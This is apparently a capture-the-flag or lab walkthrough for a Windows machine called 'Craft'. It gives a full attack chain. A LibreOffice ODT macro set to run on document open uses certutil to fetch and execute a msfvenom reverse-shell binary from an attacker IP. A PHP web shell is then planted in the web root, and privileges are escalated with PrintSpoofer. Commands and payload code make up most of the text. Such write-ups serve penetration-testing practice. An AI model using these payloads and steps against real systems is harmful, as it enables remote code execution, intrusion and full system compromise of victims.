# Craft

### Enumeration

```
80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Craft
| http-methods: 
|_  Supported Methods: GET POST OPTIONS
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
```

There is a file upload function in the web server. It expects odt file. We try to get access with OpenOffice Macro. First, we need to install libreoffice.

```
$ sudo apt install libreoffice
```

### Initial Access

Create an odt file.

Adding macro:

Tools -> Macros -> Organize Macros -> Basic -> Select the document -> New(Macro Name module)

Then edit the macro:

Select Macro Name -> Edit

We should create a executable for shell.

```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.147 LPORT=80 -f exe -o shell.exe
```

Add these contents to macro page.

```
Sub Evil
    Shell("certutil.exe -urlcache -split -f http://192.168.49.147:8080/shell.exe C:\Windows\Temp\shell.exe && \Windows\Temp\shell.exe")
End Sub
```

Finally, we will make a creation of trigger to execute our macro.

Tools -> Customize -> Events -> Select "Open Document" -> Click: “Assign: Macro” -> Select the document's macro which name is Evil.

### Lateral Movement

To apache user.

&#x20;https://www.revshells.com/ - PHP cmd - shell.php

```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

```
C:\xampp\htdocs> certutil.exe -urlcache -split -f http://192.168.49.147/shell.php
```

```
http://192.168.147.169/shell.php?cmd=whoami
craft\apache
→ certutil.exe -urlcache -split -f http://192.168.49.147:8080/shell.exe C:\Windows\Temp\shell.exe
→ \Windows\Temp\shell.exe
```

### PrivEsc

SeImpersonatePrivilege - Enabled

PrintSpoofer.exe - https://github.com/dievus/printspoofer

```
C:\users\apache\Desktop> certutil.exe -urlcache -split -f "http://192.168.49.147:8080/PrintSpoofer.exe"
C:\users\apache\Desktop> PrintSpoofer.exe -i -c cmd
```
